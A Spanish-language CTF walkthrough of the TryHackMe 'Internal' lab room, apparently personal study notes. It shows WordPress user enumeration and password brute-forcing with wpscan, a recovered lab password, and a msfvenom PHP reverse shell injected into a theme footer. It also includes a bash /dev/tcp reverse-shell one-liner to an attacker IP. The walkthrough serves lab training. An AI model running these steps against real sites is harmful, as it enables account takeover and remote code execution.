Maquinas a utilizar **Kali Linux y Internal** [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)

  

> [!important] **Continuación de Hacking en Entornos WordPress – Parte 1**

  

- Utilizamos wpscan para hacer enumeración de usuarios y de Plugins. Importante al poner la ruta **no debemos poner** la parte de **wp-login.php.**
    
    ```Bash
    wpscan --url http://10.10.32.70/blog --enumerate u,vp
    ```
    
    ![[Imagenes/image 52.png|image 52.png]]
    
      
    
    > [!important] `-url http://10.10.32.70/blog` → Indica la URL del sitio web objetivo.
    > 
    > `-enumerate u,vp` → Solicita enumerar:
    > 
    > `u` (Usuarios): Obtendrá la lista de usuarios registrados en WordPress, lo que puede ayudar en pruebas de seguridad como ataques de fuerza bruta en credenciales.
    > 
    > `vp` (Plugins vulnerables): Identificará los plugins instalados que tengan vulnerabilidades conocidas.
    
    No nos a encontró ningún Plugin vulnerable pero si un `usuario llamado` `**admin**`**.**
    
      
    
      
    

> [!important] Nos falta la contraseña. en el caso de WordPress debemos utilizar para ello WPScan ya que es una herramienta creada específicamente para WordPress.

  

- Hacemos un ataque de fuerza bruta para encontrar la contraseña.
    
    ```Bash
    wpscan --url http://10.10.11.251/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
    ```
    
    ![[Imagenes/image 1 41.png|image 1 41.png]]
    
      
    
    > [!important] `-url http://10.10.11.251/blog` → Especifica la URL del sitio de WordPress a analizar.
    > 
    > `-passwords /usr/share/wordlists/rockyou.txt` → Utiliza el archivo `rockyou.txt`, un popular diccionario de contraseñas, para intentar encontrar la contraseña correcta mediante fuerza bruta.
    > 
    > `-usernames admin` → Establece "admin" como el usuario objetivo para el intento de acceso.
    
    Ya tenemos la contraseña que coincide con el usuario **admin**.
    
    - Usuario: admin
    - Contraseña: my2boys
    
    ![[Imagenes/image 2 40.png|image 2 40.png]]
    
    ![[Imagenes/image 3 39.png|image 3 39.png]]
    
    ![[Imagenes/image 4 37.png|image 4 37.png]]
    

  

- Una vez aquí nuestro **objetivo** debe ser como **inyectar un código malicioso en WordPress**. Es decir como editar una platilla (pagina web) para añadir un código malicioso para poder adquirir ejecución remota de comandos en WordPress .
    
    - Nos movemos a la sección **Appearance → Theme Editor**
        
        ![[Imagenes/image 5 36.png|image 5 36.png]]
        
        ![[Imagenes/image 6 34.png|image 6 34.png]]
        
    
      
    
    - Hacemos un clip en Theme Footer
        
        ![[Imagenes/image 7 32.png|image 7 32.png]]
        
        ![[Imagenes/image 8 30.png|image 8 30.png]]
        
          
        
    - En caso de que haya código como es en mi caso lo eliminamos todo.
        
        ![[Imagenes/image 9 27.png|image 9 27.png]]
        

- En un terminal creamos un con msfvenom.
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > wp.php 
    ```
    
    ![[Imagenes/image 10 23.png|image 10 23.png]]
    
    Señalo nuestra IP que he obtenido con `ifconfig`
    
      
    
- Hacemos un cat de wp.php y copiamos su contenido.
    
    ```Bash
    cat wp.php 
    ```
    
    ![[Imagenes/image 11 17.png|image 11 17.png]]
    
      
    
- Pegamos el contenido del archivo malicioso en **Edit Theme** y pulsamos en el botón **Update File.**
    
    ![[Imagenes/image 12 17.png|image 12 17.png]]
    

- En un terminal nos ponemos con netcat a escuchar el puerto 443
    
    ![[Imagenes/image 13 16.png|image 13 16.png]]
    

  

- Refrescamos la pagina principal del WordPress **http://10.10.11.251/blog/** . (Recordemos que que el **Footer** que hemos modificado es básicamente la pagina principal de WordPress). Y ya tenemos acceso remoto a la maquina victima .
    
    ![[Imagenes/image 14 14.png|image 14 14.png]]
    

  

- Establecemos una nueva conexión ya que como sabemos las conexiones creadas con msfvenom duran poco tiempo.

- En **https://www.revshells.com/**
    
    ![[Imagenes/image 15 13.png|image 15 13.png]]
    
    `bash -c "sh -i >& /dev/tcp/10.21.166.149/444 0>&1"`
    
    > [!important] **OJO,** cuidado con el tipo de comillas que se utilizan deben ser las rectas.
    
- Ponemos otro netcat a la escucha en el puerto 444
    
    ![[Imagenes/image 16 10.png|image 16 10.png]]
    

  

- Pegamos el código en la conexión 443 y ya tendremos una conexión estable en el puerto 444.
    
    ![[Imagenes/image 17 8.png|image 17 8.png]]
    
    ![[Imagenes/image 18 6.png|image 18 6.png]]
    

  

> [!important] En caso de que en WordPress exita la opcion de “File Upload” , solo deberíamos subir el archivo malicioso que hemos creado y después llamarlo desde la URL